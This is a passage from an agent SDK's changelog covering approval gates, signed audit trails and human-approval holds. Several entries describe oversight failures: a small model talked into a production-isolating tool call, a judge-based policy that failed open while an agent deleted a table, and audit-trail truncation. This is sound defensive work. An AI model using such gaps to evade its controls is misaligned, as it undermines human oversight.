  `authority=ApprovalAuthority(...)` to `InMemoryApprovals` or `FileApprovals`
  and every decision is checked when it is made. `ApproverRule` names approvers
  or roles (resolved by `roles_of`) for actions carrying given labels, with a
  `quorum` of distinct approvers; an action matching several rules needs each
  rule's quorum, and one authorised denial ends it. The principal that requested
  an action cannot approve it, directly or through a delegation it granted,
  unless every matching rule sets `allow_self_approval`. `Delegation` lends an
  approver's authority to someone else until a deadline. A decision without
  authority raises `ApprovalAuthorityError` and stays on the record as a
  rejection; an action no rule covers cannot be approved by anyone. Records now
  carry `labels`, `approvals` and `rejections`, and the audit trail names every
  approver.

- **An audit trail someone outside the runtime can verify.** (#8)
  `AuditTrail(signer=Ed25519Signer.from_pem(...))` signs every record's hash
  with Ed25519 and names the key. `verify(keys={key_id: public_pem})` and
  `verify_jsonl(exported, keys=..., expected_head=...)` check an export with
  only the public keys, and reject a modified, deleted or reordered record, a
  truncation past the anchored head, and a chain rebuilt around an edit and
  re-signed with an untrusted key, which a keyless chain cannot catch.
  `use_signer` rotates keys; a verifier given both public keys accepts the
  whole trail. Signing needs the new `audit` extra; an unsigned trail exports
  exactly as before.

- **A hold can pause the run and wait for a named person, across a restart.**
  (#5) `gate_tool(..., on_refusal="interrupt", approval=store)` turns a
  `require_human` hold into a pause: the agent yields an `InterruptEvent` whose
  `metadata` carries the `approval_id`, the checkpointer keeps the
  conversation, and the store keeps the pending approval. `store.decide(id,
  "approved" | "denied", by=...)` records who decided; `agent.resume(...,
  perform_dangling=True)` re-issues the held call, which runs exactly once on
  approval and returns a refusal on denial. Approval ids are a digest of the
  principal, tool and arguments, so different arguments need their own
  approval, and an approval is consumed before the side effect, so a repeated
  call holds again. New: `ApprovalStore`, `InMemoryApprovals`, `FileApprovals`,
  `ApprovalRecord`, `call_digest`, and `admit(..., approved_by=...)`.

### Changed

- **Sandbox provider names resolve through entry points.** (#13) A name other
  than `subprocess`, `local` or `docker` is looked up in the
  `tulip.sandbox_providers` entry-point group instead of being handed to
  `tulip_sandbox.build_provider`. `tulip-sandbox` was never published to PyPI,
  so for anyone installing from PyPI an unknown name raises `SandboxError` as
  before, and `docker` now works. A private provider package keeps working by
  registering its providers under that group.

- **Context management counts tokens by default.** (#9) When model metadata
  knows the context window, an agent with no `conversation_manager` now gets
  `LLMCompactor(context_length=...)` with no summariser: stale tool output is
  pruned and a token-budgeted tail kept, with no extra model calls. Before, the
  default was a 40-message window, so a run with large tool outputs could still
  exceed the window and fail late. When the window is unknown the message
  window stays, and it is now installed at any `max_iterations` (it used to be
  skipped at 10 or fewer). `conversation_manager=NullManager()` turns
  management off.

### Removed

- **References to `tulip-integrations`, which is not published.** (#10) Docstrings in
  `tulip.security` (package, `adapter`, `context`, `edr`, `intel`, `siem`, `testing`,
  `fingerprint`) and `examples/integrations/` pointed readers at it for live
  vendor adapters and the GPU-probe lifecycle. They now say those are
  integrations you write against the same contract. The stray, generated
  `ablation_report.json` is no longer tracked.

- **The SDK stands alone: no more `tulip-frameworks` or `tulip-gateway`.**
  (#4) The README no longer sends readers to install either package or to
  reach the gate over `/v1/admit`, and
  `examples/notebook_88_framework_interop.py` (which needed
  `tulip-frameworks`) is gone with its test. `gate_tool`'s refusal payload
  keeps its keys: it is now documented as the SDK's own contract rather
  than one shared with the bridges. No code path changes.

### Fixed

- **The README said a hold paused the run and survived a restart; it did not.**
  (#5) A hold returned a refusal the model read, and the run carried on. The
  sentence now describes the `on_refusal="interrupt"` path above.

- **`LLMCompactor` could send a conversation a provider rejects.** (#9) Its
  head/tail cut could separate an assistant's tool calls from their results.
  The cut is now repaired: orphaned results and unanswered calls are dropped
  (a paused run's final held call is kept), and the opening user turn is
  re-attached when none survived.

## [2.13.0] - 2026-09-10

### Added

- **Code mode: programmatic tool calling that still clears the gate.**
  (#176) `Agent(code_mode=True)` registers `run_code`: the model writes a
  Python program that calls the agent's other tools via `tools.call(...)`
  in a loop, without round-tripping each result through the conversation —
  the execution-model change the field converged on this year, with its
  measured 38–64% token reductions. Every other implementation forks the
  paths: in-sandbox calls bypass the framework's hooks and guardrails.
  Ours refuses the fork. The program runs in an isolated `python -I`
  interpreter with no tool implementations inside; each `tools.call` is an
  RPC to the host, and the host routes it through the exact seam a
  loop-issued call takes — before-hooks (a cancel or an `AdmissionError`
  reaches the program as a catchable `ToolRefused`, never as the effect),
  hook-modified arguments, the registered Tool itself (a `gate_tool`
  wrapper and its `admit()` still stand in front of the side effect, and
  the refusal lands on the audit chain), then after-hooks (result
  replacement is what the program reads). Verified live: a program totaled
  five prices in one call and attempted a charge; the gate refused it, the
  effect never ran, and the trail verifies with the refusal recorded.

- **Deferred tools + `tool_search`: schemas on demand.** (#177) Tool
  definitions dominate the window on tool-heavy agents (the field measured
  ~85% token reduction from on-demand loading). `@tool(deferred=True)`
  keeps a tool's schema out of every model call until the model asks: a
  `tool_search` builtin (auto-registered when any deferred tool exists,
  announced by one system-prompt line) matches keywords against the
  catalog and surfaces the winners to the next turn. Deferral is
  **visibility only** — a deferred tool is registered, gated, labelled and
  sandbox-checked from the moment of construction, activation cannot widen
  authority, and the search call itself goes through the ordinary tool
  seam, so an audit sees what the model went looking for. Verified live:
  the model searched "currency conversion", loaded the deferred converter,
  and used it.

## [2.12.5] - 2026-09-06

### Fixed

- **`PgVectorStore` no longer silently discards its configuration.** (#171)
  A ready-made `PgVectorConfig` passed under any keyword was accepted and
  thrown away — the store ran on `postgres@localhost:5432/postgres` while
  every declared DSN, table name and pool size went nowhere, discovered
  only when a real ingest connected to the wrong database. Three changes,
  each turning silence into an error: `PgVectorConfig` now forbids unknown
  fields (a typo'd keyword raises instead of vanishing); the store accepts
  the object explicitly as `config=` and refuses the ambiguous mix of
  config-plus-individual-settings (a config under the wrong keyword raises
  with a pointer to `config=`); and a store given NO connection settings
  raises instead of falling back to `postgres@localhost` — inside a
  container that fallback is a connection refused, and on a host with a
  listening Postgres it writes a tenant's vectors into whatever database
  happens to be there. Local dev says `host="localhost"` explicitly.

### Added

- **Assistant text answers to its first-guess name.** (#165) Streaming
  callers found the assistant's prose on `ThinkEvent.reasoning` — which
  reads like chain-of-thought you would deliberately not show — and the
  final answer on `TerminateEvent.final_message`, easy to skim past on an
  event that reads like a lifecycle signal. Both now also answer to
  `.content`, the name every first guess reaches for, and the docstrings
  say which text arrives where.

- **`ModelChunkEvent` says why it is not firing.** (#164) The event fires
  only with `stream_tokens=True`; without the flag a consumer got no
  chunks, no error, and no pointer. The class docstring — where an IDE
  lands — now leads with the flag and names where batched text arrives
  instead.

## [2.12.4] - 2026-09-06

### Fixed

- **The approved call clears the hook seam like any other.** (#172)
  `resume(perform_dangling=True)` re-invoked the held call through the bare
  executor, so `on_before_tool_call` / `on_after_tool_call` never fired for
  the single most consequential call in a governed run — the one a human
  approved. Measured live: a playbook recorded a required step as *skipped*
  on a run that demonstrably performed it — an audit trace under-reporting a
  privileged action, the one direction this machinery may never err in. The
  performed call now runs through the same hook orchestration as the loop's:
  a before-hook veto is honoured (a second veto is legitimate — a policy
  hook entitled to block the call in the loop is entitled to block it on
  resume), hook-modified arguments are used, and an after-hook's result
  replacement lands in the fold the model reads. The call also now emits
  `ToolStartEvent` before its `ToolCompleteEvent`, so a stream consumer
  finally sees the ARGUMENTS the approved call ran with.

- **HTTP MCP connects against both mcp signatures.** The `mcp` package
  renamed `streamablehttp_client` → `streamable_http_client` and changed
  its signature (a ready `http_client` replaces the
  `auth`/`httpx_client_factory` pair), so a fresh install broke HTTP
  transport at import time — surfaced as CI's mypy and the SSRF-guard test
  failing on the import, not the guard. `MCPClient._connect_http` now
  branches on what the installed version offers; either way the client
  carries the configured auth, TLS-verify and redirect settings.

- **`PlaybookStep.uses` resolves on the auto-installed path.** (#172,
  adjacent) `PlaybookEnforcerHook` never passed `skills=` to
  `PlaybookEnforcer.from_playbook`, so on the SDK's own
  `Agent(playbook=...)` path every `uses:` reference resolved to nothing
  and constrained nothing — silently. The hook now accepts `skills` and the
  initializer hands it `config.skills`, which was sitting right there.

## [2.12.3] - 2026-08-27

### Fixed

- **A hook's replaced tool result is actually used.** `AfterToolCallEvent`
  documents `event.result` as writable — "set event.result to replace the
  tool result" — but the run loop folded the ORIGINAL result into state,
  the model's tool message, and the `ToolCompleteEvent` before the hook
  ever ran: only `retry` had any effect, and a replacement was silently
  discarded. Found by a host that slims bulky tool payloads for the model
  in an after-hook and could not understand why the model kept reading the
  raw form. The after-hook now runs BEFORE the fold, its replacement lands
  everywhere the docs promise (a dict replacement is serialized the way
  tool returns are), and — the same inversion — a `retry`'s re-executed
  result now reaches the model instead of the pre-retry one. In
  `tool_event_order="completion"` mode the early-streamed event still
  carries the pre-hook result; state and messages get the hook's version.

- **A failing tool is no longer invisible to the model.** `ToolResult.error`
  never crossed the wire: `Message.tool` copied only `content`, which is
  empty when a tool raises, so the model saw a blank tool result — it
  retried, or worse, answered as if the call had succeeded, and only event
  consumers ever learned why it failed. An error with no content now
  becomes `Error: <message>` in the tool message; a tool that wrote
  something before failing keeps its own words.

### Added

- **`ModelChunkEvent.model` — who is actually answering.** Behind a router
  the served model is not the requested one: a fallback can take the turn
  while the primary restarts, and the stream is the only place the truth
  appears. The chat-completions provider now reads `chunk.model` off the
  wire and stamps it on every chunk event, so a streaming UI can announce
  the model the reader is talking to — and notice when it changes
  mid-conversation. Best-effort: `None` when the transport does not say.

## [2.12.2] - 2026-08-20

### Fixed

- **A missing `asyncpg` now fails where it can be understood.** `PgMemory`
  imports the driver lazily inside its pool builder, so an environment
  without it raised a bare `ModuleNotFoundError` from deep inside a
  coroutine on first *use* — long after the mistake, naming no package and
  no extra. Found in a deployment where durable memory had been silently
  dead: every save failed, and the agent, reading past the error field,
  answered "Got it." The constructor now checks for the driver and says what
  to install, alongside the `dim` checks that were already there.

- **A tool called with the wrong arguments explains itself.** A model that
  omitted a required argument got `search() missing 1 required positional
  argument: 'title'` — a Python signature error, accurate and useless to the
  caller that has to recover from it. `Tool.execute` now binds before
  calling and raises a message naming the tool and the missing parameters,
  telling the caller to ask for a value rather than guess. A `TypeError`
  raised *inside* a tool keeps its own message, so a real defect is never
  disguised as a bad call.

### Documentation

- **`run_sync` says that it does not remember.** Prior turns are reloaded
  only with a configured checkpointer *and* a `thread_id`; without them each
  call starts from an empty conversation. That is the right default for a
  shared agent and a surprise to anyone who expected it to follow along, so
  the docstring now states it plainly.

## [2.12.1] - 2026-08-18

### Fixed

- **A performed dangling call is now visible.** `perform_dangling` executed
  the held call before the loop began streaming, so nothing downstream saw
  it: a consumer watched a run resume and finish having recorded no action,
  while the action had in fact happened. `resume()` now yields the same
  `ToolCompleteEvent` the loop would have, so traces, audit sinks and UIs
  see an approved action exactly as they see any other tool call.

## [2.12.0] - 2026-08-18

### Added

- **`Agent.resume(…, perform_dangling=True)` — the approval actually happens.**
  2.11.1's fold fixed the conversational rhythm but left the semantic half
  open: folding the verdict *text* tells the model its held call already
  returned `"approve"`, so a live model — reasonably — never re-issues it,
  and nothing ever performs the action (measured live through a governed
  gateway; the run reports success). With the new flag, `resume()`
  **re-invokes the dangling call itself** — same tool, same arguments,
  through the normal executor — and folds the *real* result. A gated wrapper
  decides under the caller's primed decision: approve executes exactly once,
  deny refuses, and the model sees what actually happened. `ask_user` and
  the no-dangling-call path are byte-for-byte unchanged, and the flag
  defaults to off, so every existing caller keeps 2.11.1 behavior. The flag
  is caller-asserted: pass it only when the dangling call is a gated
  *action* to perform — a question-style tool keeps the plain text fold. If
  the tool is no longer registered at resume, the reply folds as text
  rather than inventing a result.

## [2.11.1] - 2026-08-17

### Fixed

- **An approved action could silently not happen.** `Agent.resume()` searched
  the transcript for a dangling **`ask_user`** call specifically. An approval
  hold suspends on the *governed call itself* — `refund_customer`, not
  `ask_user` — so every approval resume fell through to the system-note path
  instead. The model then returned an empty turn, the loop read that as
  "finished", and the approved action was never performed while the run
  reported success.

  That is the worst available failure for a governance feature: the transcript
  shows an approval and an untroubled reply, and nothing anywhere records that
  the action did not happen. `resume()` now folds the reply into any unanswered
  call, with `ask_user` still winning when both are present, so the established
  path is unchanged and only the broken case moves.

- **The test doubles dropped every tool call when streamed.**
  `_RecordingModel.stream()` emitted text chunks and a done event, but never
  the tool calls — and the agent loop rebuilds the turn from those events
  alone. A streaming test using the double exercised nothing, raised nothing,
  and passed. `stop_reason` is carried for the same reason: the loop reads it
  to decide whether the turn ended.

- **A comment pointed at a file that is not in the repository.** The substance
  now lives in the comment instead.

## [2.11.0] - 2026-08-16

### Added

- **Amazon Bedrock, via the Converse API** (`bedrock:` prefix). The one provider
  gap that mattered: sixteen prefixes already reached endpoints speaking the
  OpenAI wire protocol, and Bedrock speaks its own, so an AWS shop had to stand
  up a LiteLLM gateway to talk to a service it already had credentials for.

  ```python
  Agent(config=AgentConfig(model="bedrock:us.amazon.nova-lite-v1:0"))
  Agent(config=AgentConfig(model="bedrock:us.meta.llama3-3-70b-instruct-v1:0"))
  ```

  Converse rather than `invoke_model`, so one code path covers every model on
  the service instead of a request body per vendor. Streaming, tool use, system
  prompts, Bedrock guardrails and prompt-cache token counts all go through it.
  Credentials are boto3's standard chain — environment, profile, SSO, instance
  role, IRSA — because that is what an AWS account already has configured.

  `boto3` is an optional extra (`pip install "tulip-agents[bedrock]"`) imported
  lazily, so the four-package core install is unchanged.

- **Azure OpenAI** (`azure:` prefix). OpenAI's models, but not at OpenAI's
  address and not with OpenAI's auth: the URL names a *deployment* rather than
  a model, credentials go in an `api-key` header, and every request needs an
  `api-version`. That is why it could not be one more row in the compatible
  table. It is `OpenAIModel` with `AsyncAzureOpenAI` behind it, so message
  conversion, tool calls, streaming and structured output are inherited rather
  than reimplemented — no second code path to drift. Entra ID tokens work in
  place of a key, which is how most Azure shops authenticate in production.
  Reuses the existing `openai` extra; no new dependency.

- **Google Gemini** (`gemini:` prefix), through Google's own OpenAI-compatible
  endpoint — first-party, not a proxy. It covers chat, tools and streaming,
  which is the entire surface Tulip drives, so this is a routing-table row
  rather than a second client to keep current.

  Together these close the `Bedrock / Gemini / Azure` row that the capability
  matrix marked *not offered*, and take the registry from **18 prefixes to 21**.

### Fixed

- **Assistant turns no longer mix text and tool-use blocks.** Converse rejects
  the combination on some model families and accepts it on others:

  ```
  ValidationException: messages.N.content: Conversation blocks and tool use
  blocks cannot be provided in the same turn.
  ```

  Found by running the same conversation against a second vendor — it passed on
  Amazon's models and 400'd on Meta's. The tool calls are kept and the model's
  own preamble is dropped from the replayed history, which costs nothing the
  next turn needs, since the tool result that follows carries the content.

## [2.10.0] - 2026-08-16

Findings from a measured comparison against AWS Strands 1.52.0 — both SDKs
installed side by side, every capability probed by import, and the same governed
refund run through each. Two of the findings were ours.

### Fixed

- **`AuditTrail.verify()` promised more than a hash chain can deliver.** Its
  docstring read *"no edit, deletion, or reorder"*. Edits, reorders, and
  deletions from the **middle** are all caught. Truncation is not: drop records
  off the end — or discard the trail entirely — and what remains is a valid
  shorter chain that returns `True`.

  This is a property of hash chains generally, not of this implementation:
  nothing inside a chain can attest to a link that was never handed to it. The
  cryptography was never wrong; the sentence was, in the project's flagship
  security feature. Both the method and module docstrings now state the
  boundary exactly, and `tests/unit/test_audit_truncation.py` pins all four
  attacks — including the one that is *supposed* to go undetected, so the
  docstring cannot quietly drift back.

- **Seven public symbols had no docstring** — three `a2a.protocol_v1`
  converters, two `rogue.challenge` entry points, and `router.goal_frame`'s
  `Risk` and `Complexity`. Every public export in the SDK now carries one.

### Added

- **`verify(expected_head=...)`** closes the truncation gap for callers who want
  it closed. Persist `trail.head` somewhere the agent cannot reach and pass it
  back; every attack — truncation included — moves the head:

  ```python
  anchor = trail.head                    # to a WORM bucket, or a co-signer
  ...
  trail.verify(expected_head=anchor)     # False if anything was removed
  ```

- **`refusal_reason` on `gate_tool`** — what the *user* hears when an action is
  refused. The default is still the policy's own reason, which names the checks
  that fired. That is right for an audit record and wrong for a customer: run
  against a live model, it produced *"the blast radius (3) exceeds the maximum
  1"* and *"classified as a large_refund"* in a customer-facing sentence. Pass a
  string, or `(decision) -> str` to vary by outcome. The full policy reason is
  still what goes to the trail.

### Not done

- **Suspending a run on a hold** — `on_refusal="interrupt"` — was built and then
  pulled. The gate can raise the pause, and the runtime does suspend and
  checkpoint. But on resume the loop folds the human's answer in as the *result*
  of the held tool call, and nothing re-invokes the gate to actually perform the
  action. The agent can then tell the user a refund was issued when nothing ran.
  A silent false success is worse than no feature, so this needs the agent loop
  to carry the approval through a resume, not a new parameter on `gate_tool`.

## [2.9.0] - 2026-08-16

One gap closed in `gate_tool`, found by checking a claim rather than repeating it.

### Added

- **`ApprovalBridge`, and `approval=` on `gate_tool`.** A held action now carries
  an `approval_id` the agent can poll and a `next` telling it how, while a human
  decides on a channel the agent cannot reach.

  Without it a hold told the model `"held_for_approval"` and stopped there — true,
  and not actionable, which leaves the agent apologising to a user about a refund
  that may already have been approved.

  This was found by verifying a claim made in 2.8.0's own notes: that
  `gate_tool`'s refusal matches what the `tulip-frameworks` bridges return. The
  five core keys did match. The bridges send two more on a hold, and those were
  missing.

  `ApprovalBridge` is a structural `Protocol` with no import-time dependency, as
  the bridges' is — so one broker object satisfies both and neither package has to
  import the other. A **denial** deliberately gets no id: it is final, and offering
  one would invite the agent to wait for a decision that is not coming.

  Both parameters are keyword-only with defaults; nothing that worked in 2.8.0
  changes shape.

## [2.8.0] - 2026-08-16

A release about controls that were not controlling anything. Six settings and
one whole feature were documented, shipped, and did nothing — and the pattern
in every case is the same: the work is done, and the result never reaches the
caller.

### Added

- **`gate_tool` — put the admission gate in front of a tool, in one line.**

  ```python
  agent = Agent(model=model, tools=[
      lookup_order,                                     # read-only, ungated
      gate_tool(issue_refund, policy=ControlPolicy()),  # gated
  ])
  ```

  `tulip-frameworks` has shipped `gate_langchain_tool` and its siblings for a
  while, so a LangChain user could put `admit()` in front of a tool trivially
  while a Tulip user hand-wrote the try/except — on the one feature the project
  is built around. Everything needed was already in core: `tulip.control.action`
  was promoted there in 2.3.0 "so the SDK, the gateway, the registry and these
  bridges share one derivation instead of four", and only the bridges used it.

  The returned tool keeps the original's name, description and parameter
  schema, so the model cannot tell the difference — the gate is not something
  it can be talked around. A refusal comes back as a readable result rather
  than an exception, in the same shape the bridges return, so a policy reads
  the same either way. `on_refusal="raise"` is there for a caller that would
  rather stop.

  Gating a **sandboxed** tool composes rather than replacing it: the gate
  decides, then the original tool runs in its own sandbox. A refusal never
  reaches the sandbox at all.

- **`GSARValidationError`**, which `GSARConfig.fail_on_low_score` had been
  documented as raising since it was written. See below.

### Fixed

- **Ten async clients outlived the event loop that built them.** `httpx` binds
  a connection pool to the loop running when the client is created, and
  `openai` and `anthropic` are `httpx`. Cached on `self`, they worked exactly
  once per process:

  ```
  loop 1: OK    loop 2: APIConnectionError: Connection error.    loop 3: OK
  ```

  Two things made it expensive. The message reads as a provider outage, so the
  first hour goes to the key, the network and a status page. And it *recovers*
  on the third loop, because the failed request evicts the dead connection — so
  it presents as an intermittent network blip. Two `asyncio.run()` calls, a
  notebook cell run twice, or FastAPI's `TestClient` all reach it.

  Fixed across `models/native/openai`, `models/native/anthropic`,
  `rag/embeddings/openai`, `providers/image`, `providers/speech`,
  `memory/backends/http`, `memory/backends/mysql`,
  `memory/store_backends/postgresql`, `rag/stores/opensearch` and
  `rag/stores/pgvector`, and factored into `tulip.core.loop_bound` — the
  pattern had already been hand-written three times with three different cache
  keys. A guard now fails on a lazily-cached client with no loop key.

- **`on_iteration_start` and `on_iteration_end` never fired.** `HookProvider`
  documents eight callbacks; six worked. The dispatch machinery existed and
  nothing called it. A hook that never fires is worse than one that does not
  exist: you write it, attach it, see no error, and conclude the run never
  reached that phase.

- **`AgentResult.grounding_score` and `.ungrounded_claims` were always `None`
  and `[]`.** The grounding loop ran — it can trigger replans — and emitted its
  verdict; nothing carried it to the result. (Note: grounding only runs when the
  agent used a tool, since evidence comes from tool results.)

- **`ExecutionMetrics.reflexion_evaluations` and `.grounding_evaluations` were
  always `0`.** The runtime counts both; they were locals in a generator.

- **`GSARConfig.fail_on_low_score` did nothing.** It was documented as raising
  `GSARValidationError`, and that exception existed only inside the sentence
  promising it. An agent explicitly configured to refuse un-grounded output
  shipped it silently — the one outcome the setting exists to prevent.

- **`GuardrailConfig.action_overrides` failed silently on a wrong key.** Rule
  names are prefixed: a pattern under `blocked_content_patterns["sql_injection"]`
  raises `blocked_sql_injection`. Overriding the bare name was a lookup miss
  that fell through to `default_action` without a word — you believed you
  downgraded a rule to WARN, it stayed at BLOCK. The project's own test fell
  into it. An override no rule can consult is now refused, and names the one you
  probably meant.

- **The memory backends accepted unknown constructor kwargs.** `notebook_68`
  passed `namespace=` where the field is `prefix=`; nothing complained, the
  namespace did not apply, and every run shared one Redis keyspace.

### Changed

- **`SteeringHook` now says which of its two controls can fail open.** Measured
  against a self-hosted Qwen3.6-35B: with `policy="Never allow delete or
  destructive operations."` the judge did not intervene and the agent reported
  deleting the table, while a tool calling `admit()` held under the same model
  and prompt. `policy` is advisory and enforced by a judge; `interrupt_tools`
  is a set-membership check that never consults the judge and cannot fail open.
  The docstring documented them identically.

## [2.7.0] - 2026-08-15

One deprecation, one retrieval bug, and the two most-read examples finally
matching their own documentation.

### Deprecated

- **`tulip.loop` is deprecated and will be removed in 3.0.0.** It is a second
  ReAct implementation, parallel to the one the supported `Agent` runs, and
  `Agent` has never used it — the only reference from the production runtime
  was one private helper, `_find_matching_execution`, now moved to
  `tulip.tools.executor.find_matching_execution`.

  Two implementations of the same idea is worse than either alone: they drift,
  and a bug fixed in one stays live in the other. Nothing in `tulip.loop` is a
  capability `Agent` lacks.

  Every name still imports and works until 3.0.0, and each access emits
  `TulipDeprecationWarning`. To find them in your own code:

  ```
  python -W error::DeprecationWarning -m pytest
  ```

  | Instead of | Use |
  |---|---|
  | `ReActLoop`, `create_react_loop` | `tulip.agent.Agent` |
  | `ReActLoopConfig` | `tulip.agent.AgentConfig` |
  | `LoopRunner` | `await agent.arun(prompt)` |
  | `BatchRunner` | `tulip.evaluation.EvalRunner` |
  | `StreamingCollector` | `async for event in agent.run(prompt)` |
  | `ConditionalRouter` | `StateGraph` conditional edges, or `tulip.router` |
  | `ThinkNode` / `ExecuteNode` / `ReflectNode` | internal to `Agent`; hook them with `tulip.hooks` |

  This is also the first use of `TulipDeprecationWarning`. The policy in
  `DEPRECATION.md` had been documented in two files and never exercised, so
  until now nothing proved a deprecation would actually reach a consumer.

### Fixed

- **`Mem0Manager` retrieved nothing.** Reads went out unscoped, so a lookup
  that should have been narrowed to the thread returned the wrong rows or
  none. Scoped through filters now.

- **Notebooks 06 and 07 are what their pages say they are.** The pages
  described LEDGER, a transaction-triage agent, and a deployment-readiness
  check. The code was a general-purpose assistant answering "What is the
  capital of Japan?" and a weather lookup. `grep -rl LEDGER examples/*.py`
  found nothing. These are the first two examples a new reader opens, and the
  drift was concentrated exactly there. The pages were right, so the code
  moved.

- **Four cross-references pointed readers at agents that do not exist.**
  `notebook_27` called notebook 26's orchestrator MARSHAL (it is STEWARD),
  `notebook_70` called notebook 27 CURATOR (it is RIGHTSIZER), and CURATOR
  appears nowhere in the repo. A reader who followed one arrived somewhere
  else with no way to tell which end was wrong.

- **The bundled mock answered every triage prompt identically**, so three
  transactions with three different right answers each got the same wrong one.

### Documentation

- `examples/README.md` explains the numbering: the numbers are stable
  identifiers, never reused, carrying no ordering. The gaps are not missing
  files — 10, 41-44 and 53-54 never existed. Renumbering to close them would
  break every published URL and every in-prose cross-reference to fix an
  appearance.

## [2.6.0] - 2026-08-15

The release that came out of a full audit of the SDK against its own
documentation. The framework was not weak; the first hour with it was broken.
Every defect found was in hand-written prose or fixture code, never in
generated reference, and they had one root cause: nothing ran the
documentation.

### Added

- **A step can say what it must find out.** `RequiredProbe` declares evidence
  a playbook step has to gather before it can honestly be called done.
  `expected_tools` asks "was the right tool called?"; this asks "was the right
  thing *looked at*?" — a different question, and the one an auditor actually
  has, since an agent can call the correct tool against the wrong target and
  satisfy the first while failing the second. A step names a capability with
  `uses`, and the skill supplies both the tools and the probes.

- **Eighteen model providers, up from two.** `openai:` and `anthropic:` are
  native; `ollama:` · `vllm:` · `lmstudio:` · `llamacpp:` · `litellm:` ·
  `groq:` · `together:` · `openrouter:` · `deepseek:` · `mistral:` · `xai:` ·
  `fireworks:` · `cerebras:` · `perplexity:` · `nvidia:` arrive with their
  base URL and key convention filled in, plus `openai-compatible:` for
  anything else. Before this, anyone on a self-hosted or gateway endpoint had
  to build the model object by hand.

- **`tulip.testing`** — `ScriptedModel`, `FunctionModel`, `text()`,
  `tool_call()`. The repo contained thirteen private `_ScriptedModel` classes,
  which is the shape of a missing feature. Includes a recording surface
  (`received_messages`, `offered_tools`, `call_count`, `last_prompt`) so a
  test can assert what the agent *sent*, not only what it returned.

- **`model_kwargs` on `AgentConfig`**, forwarded to `get_model()` when `model`
  is a string. `AgentConfig` sets `extra="forbid"`, so provider configuration
  could not travel with the documented one-string form — which made
  `openai-compatible:` reachable only through an environment variable, since
  that prefix *requires* a `base_url`.

- **`agent_name` on every event.** The docs asserted this and it did not
  exist. A caller merging two agents' streams had no way to tell the
  researcher's tool call from the writer's. A nested agent's events are never
  relabelled by the orchestrator around them.

- **Evals run against a `StateGraph`** via `as_eval_target()`. The docs showed
  `EvalRunner(agent=graph)`; every case errored. `expected_tools` and
  `expected_tool_sequence` now match on node ids, which is what a graph
  regression suite is actually for.

- **An LLM judge that exists.** `tulip.evaluation` advertised "LLM-as-judge
  scoring" and shipped 250 lines of boolean checks. `LLMJudge` grades against
  a written rubric and returns a typed `Verdict`; `check_trajectory` asserts
  tool *order*, which `expected_tools` could never express. The judge never
  retries for a pass, and raises rather than scoring zero when it cannot be
  reached — a "failure" that means the judge was down is worse than no eval.

- **RAG has an entrance.** `load_text`, `load_markdown`, `load_html`,
  `load_pdf`, `load_directory` and `recursive_chunks`. The vector stores and
  rerankers were real; the pipeline was blocked at its front door.

- **MCP is wired in.** `mcp_servers` on `AgentConfig`, and a helper that works
  in an async context — `to_tulip_tools()` called `run_until_complete()` from
  a sync method and raised inside a running loop.

- A **chat loop** example, and a **framework-interop** example that builds a
  real LangChain tool, drives it through LangGraph's own ReAct loop, watches a
  $4,000,000 refund execute, then wraps that one tool and runs the identical
  agent again.

### Fixed

- **Backend clients were cached across event loops.** `redis.asyncio` binds a
  connection pool to the loop that created it, so the second loop inherited a
  dead pool and failed with `Event loop is closed`. Not exotic: FastAPI's
  `TestClient` runs each request through its own portal, and any code calling
  `asyncio.run()` twice hits it. Fixed for Redis, OpenSearch and PostgreSQL.

- **`EvalRunner.run()` ignored `expected_tool_sequence`.** The sync path was a
  hand-copied second implementation that had drifted, so a case asserting the
  wrong tool order came back green. An ordering assertion silently never
  evaluated is worse than no assertion, because the report says it was
  checked.

- **The sliding window dropped the task.** When a window retained no user turn
  at all — an agent loop, assistant/tool all the way down — the opening
  request went with it, leaving the model working from a role description and
  a wall of tool output. On Qwen-family templates it fails outright.

- **OpenAI-compatible endpoints always get a user turn**, which several
  servers require and which a system-prompt-only request did not send.

- **Adherence counted the wrong probes** and reported 1.00 while failing.

- **The bundled mock could never call a tool**, so every tool-centric example
  printed `Tool calls made: 0` — including the notebook whose page says this
  is what turns an LLM into an agent.

- **Nineteen pages gave a "live model" command that silently ran the mock**,
  because `get_model()` read only `TULIP_MODEL_PROVIDER`.

- Six documented claims the code did not back, and a further four found on a
  second pass.

### Changed

- **CI runs the documentation.** Every Python block in `README.md` and
  `examples/README.md` is checked against the installed SDK — it must compile,
  every `from tulip... import X` must resolve, and keyword arguments must
  exist on the callable. Compile rather than parse, because `ast.parse`
  *accepts* top-level `await` and only `compile()` rejects it — which is
  exactly how a quickstart shipped raising `SyntaxError`.

- Fourteen test definitions across four files were dead: Python keeps the last
  binding, so a class defined twice in one module silently discards the
  earlier one. A guard now fails on same-module shadowing.

## [2.5.1] - 2026-08-12

A runtime fix and a version string that lied. Both were found by running
the SDK against real self-hosted models rather than by reading it.

### Fixed

- **A JSON-shaped tool call is now a tool call.** `_parse_text_tool_calls`
  recognised only call syntax — `search(query="x")` — so the JSON form that
  Ollama and the Hermes/Qwen templates emit whenever the server does not lift
  it into a structured `tool_calls` field was read as prose:

  ```json
  {"name": "isolate_production", "arguments": {}}
  ```

  Found with a real `qwen2.5-coder:7b`, which was talked into isolating
  production and emitted exactly that. The call was never dispatched, so it
  was never weighed by `admit()`, never written to the `AuditTrail`, and the
  run reported the model as having *declined*. It had not declined; the
  runtime could not see the attempt.

  Nothing executed, so this was fail-safe on the action — but not on the
  record, and for a runtime whose claim is that every consequential decision
  lands on a tamper-evident trail, an attempted dangerous action that leaves
  no trace is a governance gap. "Tried to wipe production" and "declined" must
  not look identical.

  **Behavioural note for anyone upgrading:** agents pointed at small
  self-hosted models will now perform tool calls that this version previously
  dropped in silence. That is the intended behaviour, and those calls now
  clear your `ControlPolicy` first — but if you were unknowingly relying on
  them not firing, they will fire now.

  Both shapes are validated against the tool registry, deduplicated so one
  call written in both cannot fire twice, and scanned by balancing braces
  rather than by regex so a nested `arguments` object is not truncated.
  Fenced blocks and double-encoded `"arguments": "{...}"` are handled.

- **`tulip.__version__` was a release behind.** `tulip_agents-2.5.0` shipped to
  PyPI with `METADATA Version: 2.5.0` and `__version__ == "2.4.0"` inside it —
  the literal in `src/tulip/__init__.py` and the one in `pyproject.toml` are
  maintained by hand and had drifted. Anything reading `__version__` for
  telemetry, a bug report, or a compatibility check was told the wrong release
  for the whole of 2.5.0. Corrected, and `tests/unit/test_version_is_consistent.py`
  now fails CI on drift instead of leaving it for PyPI to reveal.

### Changed

- **`Agent.__init__`'s docstring names the 36 options introspection cannot
